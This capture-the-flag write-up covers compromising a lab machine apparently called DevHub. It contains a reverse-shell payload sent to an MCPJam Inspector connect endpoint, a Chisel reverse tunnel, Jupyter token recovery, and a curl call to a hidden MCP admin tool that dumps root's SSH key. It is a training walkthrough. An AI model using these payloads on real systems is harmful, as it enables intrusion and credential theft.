## Reconnaissance

A full TCP port scan is performed against the target.

```bash
nmap -p- --open -Pn -T4 --stats-every=5s 10.129.7.245 -oN basic_scan.txt
```

![open ports identified by the initial scan](/assets/images/devhub/Pasted-image-20260601194036.png)
*Initial set of open ports discovered*

Banner grabbing is performed against the open ports for additional context.

![banner grabbing results against the open ports](/assets/images/devhub/Pasted-image-20260601194250.png)

A version and script scan is then run.

```bash
nmap -p22,80,6274 -Pn -sC -sV -T4 10.129.7.245
```

The scan identifies the nginx version in use.

![nginx version identified by the script scan](/assets/images/devhub/Pasted-image-20260601194441.png)

The discovered hostname is added to `/etc/hosts`.

## Exploitation

A Netcat listener is started on the attacker machine.

```bash
nc -lvnp 9001
```

A crafted request to the MCP connect endpoint defines a malicious server configuration that spawns a reverse shell.

```bash
curl http://devhub.htb:6274/api/mcp/connect \
  --header "Content-Type: application/json" \
  --data '{"serverConfig":{"command":"bash","args":["-c","bash -i >& /dev/tcp/10.10.14.2/9001 0>&1"],"env":{}},"serverId":"mytest"}'
```

The server executes the configuration and a reverse shell is received.

![reverse shell obtained through the MCPJam RCE](/assets/images/devhub/Pasted-image-20260601202818.png)
*Reverse shell established via the MCPJam Inspector vulnerability*

### Pivoting with Chisel

Since the service on port 8888 is only exposed locally, **Chisel** is used to forward it to the attacker machine. Chisel creates an encrypted TCP tunnel through which remote ports can be exposed locally.

On the attacker host, the Chisel server is started:

```bash
# executed on attack host
./chisel server --reverse --port 1234
```

On the victim, the Chisel client connects back and forwards port 8888:

```bash
# executed on victim
./chisel client 10.10.14.130:1234 R:8888:127.0.0.1:8888 &
```

The Chisel binary requires execute permissions (`chmod +x`) before it can be run.

Accessing the forwarded port shows a request for a password or token.

![authentication prompt on the forwarded service](/assets/images/devhub/Pasted-image-20260602175125.png)
*Authentication required by the forwarded service*

A direct request to the API confirms the service is a **Jupyter**-based analytics platform.

```bash
curl -s http://127.0.0.1:8888/api
```

![Jupyter API version information](/assets/images/devhub/Pasted-image-20260602002058.png)
*Jupyter version information returned by the API*

Enumerating the API returns a `Forbidden` status. The required token is recovered by enumerating the running processes on the host, where Jupyter's startup arguments expose it in plaintext.

![Jupyter token recovered from process listing](/assets/images/devhub/Pasted-image-20260602002948.png)
*Jupyter access token found in the process arguments*

### Code Execution as analyst via Jupyter

Since the Jupyter instance runs as the `analyst` user, a command is executed through it to obtain a reverse shell as that user.

With this access, the user flag and additional information — including an `opsmcp_key` value — are recovered. A full interactive reverse shell is also obtained for the `analyst` user.

### Hidden Admin Tool

A hidden tool that does not appear in the standard listing is found, which is capable of dumping credentials.

![hidden admin dump tool discovered](/assets/images/devhub/Pasted-image-20260602180635.png)
*Hidden ops._admin_dump tool capable of dumping credentials*

This tool can target SSH keys, passwords, and tokens for different users on the system.

![targets available to the admin dump tool, including passwords and tokens](/assets/images/devhub/Pasted-image-20260602181025.png)
*Available credential targets for the admin dump tool*

A POST request is sent to `/tools/call`, passing the previously recovered API key. The body specifies the tool name `ops._admin_dump`, with the target set to `ssh_keys` and `confirm` set to `true`. This causes the service to dump root's `id_rsa` private key.

![root id_rsa being dumped via the admin tool](/assets/images/devhub/Pasted-image-20260602182009.png)
*Triggering the admin dump tool to extract root's SSH private key*

```bash
curl -s -X POST http://127.0.0.1:5000/tools/call \
  -H 'Content-Type: application/json' \
  -H 'X-API-Key: opsmcp_secret_key_4f5a6b7c8d9e0f1a' \
  -d '{"name":"ops._admin_dump","arguments":{"target":"ssh_keys","confirm":true}}'
```

> Exposing an internal "admin dump" tool through an MCP server with no authorization checks beyond a static API key allows any user who recovers that key to extract sensitive credentials for any account on the system, including root.

The response contains root's `id_rsa`, which is used to authenticate as root and complete the box.

![root id_rsa returned in the API response](/assets/images/devhub/Pasted-image-20260602184137.png)
*Root SSH private key returned by the opsmcp admin dump tool*
